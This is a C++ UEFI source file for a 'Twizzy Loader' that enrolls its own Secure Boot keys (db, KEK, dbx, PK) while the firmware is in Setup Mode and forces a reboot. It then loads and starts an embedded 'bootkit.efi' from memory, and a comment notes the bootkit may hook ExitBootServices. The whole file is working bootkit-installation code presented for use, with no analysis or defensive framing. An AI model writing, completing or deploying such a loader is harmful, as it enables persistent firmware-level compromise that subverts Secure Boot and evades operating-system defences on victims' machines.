extern "C" {
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Guid/GlobalVariable.h>
#include <Guid/ImageAuthentication.h>  // for EFI_IMAGE_SECURITY_DATABASE_GUID
}

#include "bootkit_embedded.hpp"   // contains your signed bootkit.efi
#include "keys.hpp"               // contains PK_auth, KEK_auth, db_auth, dbx_auth arrays and their sizes

// ------------------------------------------------------------------
// Helper functions
// ------------------------------------------------------------------
static BOOLEAN IsSetupMode(void) {
  UINT8 SetupMode = 0;
  UINTN Size = sizeof(SetupMode);
  EFI_STATUS Status = gRT->GetVariable((CHAR16*)L"SetupMode", &gEfiGlobalVariableGuid,
    NULL, &Size, &SetupMode);
  return (!EFI_ERROR(Status) && SetupMode == 1);
}

static BOOLEAN IsSecureBootOn(void) {
  UINT8 SecureBoot = 0;
  UINTN Size = sizeof(SecureBoot);
  EFI_STATUS Status = gRT->GetVariable((CHAR16*)L"SecureBoot", &gEfiGlobalVariableGuid,
    NULL, &Size, &SecureBoot);
  return (!EFI_ERROR(Status) && SecureBoot == 1);
}

static EFI_STATUS WriteAuthVar(CHAR16* Name, EFI_GUID* Guid,
  const UINT8* Data, UINTN DataSize) {
  return gRT->SetVariable(Name, Guid,
    EFI_VARIABLE_NON_VOLATILE |
    EFI_VARIABLE_BOOTSERVICE_ACCESS |
    EFI_VARIABLE_RUNTIME_ACCESS |
    EFI_VARIABLE_TIME_BASED_AUTHENTICATED_WRITE_ACCESS,
    DataSize, (VOID*)Data);
}

// ------------------------------------------------------------------
// Enroll custom Secure Boot keys (order: db -> KEK -> dbx -> PK)
// ------------------------------------------------------------------
EFI_STATUS EnrollCustomKeys(void) {
  EFI_STATUS Status;

  // If Secure Boot is already active and not in Setup Mode, skip
  if (IsSecureBootOn() && !IsSetupMode()) {
    Print((CONST CHAR16*)L"[Twizzy] Secure Boot active ? skipping enrollment.\n");
    return EFI_SUCCESS;
  }

  if (!IsSetupMode()) {
    Print((CONST CHAR16*)L"[Twizzy] Not in Setup Mode ? cannot enroll keys.\n");
    Print((CONST CHAR16*)L"[Twizzy] Please clear Secure Boot keys in BIOS first.\n");
    return EFI_NOT_READY;
  }

  Print((CONST CHAR16*)L"[Twizzy] Enrolling custom Secure Boot keys...\n");

  // 1. Write db (Signature Database)
  Status = WriteAuthVar((CHAR16*)L"db", &gEfiImageSecurityDatabaseGuid,
    db_auth, db_auth_len);
  Print((CONST CHAR16*)L"[Twizzy] Write db: %r\n", Status);
  if (EFI_ERROR(Status)) {
    Print((CONST CHAR16*)L"[Twizzy] db enrollment failed\n");
    return EFI_DEVICE_ERROR;
  }

  // 2. Write KEK (Key Exchange Key)
  Status = WriteAuthVar((CHAR16*)L"KEK", &gEfiGlobalVariableGuid,
    KEK_auth, KEK_auth_len);
  Print((CONST CHAR16*)L"[Twizzy] Write KEK: %r\n", Status);
  if (EFI_ERROR(Status)) {
    Print((CONST CHAR16*)L"[Twizzy] KEK enrollment failed\n");
    return EFI_DEVICE_ERROR;
  }

  // 3. Write dbx (Revoked Signatures Database) ? optional but recommended
  Status = WriteAuthVar((CHAR16*)L"dbx", &gEfiImageSecurityDatabaseGuid,
    dbx_auth, dbx_auth_len);
  Print((CONST CHAR16*)L"[Twizzy] Write dbx: %r\n", Status);
  // dbx failure is not fatal; continue.

  // 4. Write PK (Platform Key) ? MUST be last
  Status = WriteAuthVar((CHAR16*)L"PK", &gEfiGlobalVariableGuid,
    PK_auth, PK_auth_len);
  Print((CONST CHAR16*)L"[Twizzy] Write PK: %r\n", Status);
  if (EFI_ERROR(Status)) {
    Print((CONST CHAR16*)L"[Twizzy] PK enrollment failed\n");
    return EFI_DEVICE_ERROR;
  }

  Print((CONST CHAR16*)L"[Twizzy] Keys enrolled successfully.\n");
  Print((CONST CHAR16*)L"[Twizzy] System will restart for Secure Boot to apply.\n");

  // Give user time to see the message
  gBS->Stall(3000000); // 3 seconds
  gRT->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);

  // Should never reach here
  return EFI_SUCCESS;
}

// ------------------------------------------------------------------
// Main entry point
// ------------------------------------------------------------------
EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle,
  IN EFI_SYSTEM_TABLE* SystemTable) {
  EFI_STATUS Status;
  EFI_HANDLE DriverHandle = NULL;

  Print((CONST CHAR16*)L"\r\n[Twizzy Loader] Embedded loader started\r\n");

  // If in Setup Mode, enroll our keys so the signed driver is trusted
  if (IsSetupMode()) {
    Status = EnrollCustomKeys();
    if (EFI_ERROR(Status)) {
      Print((CONST CHAR16*)L"[Twizzy Loader] Key enrollment failed: %r\r\n", Status);
      return Status;
    }
    // EnrollCustomKeys restarts the system; we won't reach here.
    // (If it returns without restart, that's an error.)
  }
  else {
    Print((CONST CHAR16*)L"[Twizzy Loader] Secure Boot keys already present.\r\n");
    // If Secure Boot is active but keys are not ours, we cannot load unsigned driver.
    // We assume the driver is signed with our db key, and if the system already has our keys,
    // it will load fine.
  }

  // Load the signed bootkit driver from the embedded array
  Status = gBS->LoadImage(FALSE, ImageHandle, NULL,
    bootkit_image, bootkit_size, &DriverHandle);
  if (EFI_ERROR(Status)) {
    Print((CONST CHAR16*)L"[Twizzy Loader] LoadImage failed: %r\r\n", Status);
    return Status;
  }

  Print((CONST CHAR16*)L"[Twizzy Loader] bootkit.efi loaded from memory (signed).\r\n");

  Status = gBS->StartImage(DriverHandle, NULL, NULL);
  if (EFI_ERROR(Status)) {
    Print((CONST CHAR16*)L"[Twizzy Loader] StartImage failed: %r\r\n", Status);
  }
  else {
    Print((CONST CHAR16*)L"[Twizzy Loader] Bootkit started successfully!\r\n");
  }

  // Note: The bootkit driver may hook ExitBootServices; after it returns,
  // we just return success. The system will continue booting.
  return EFI_SUCCESS;
}
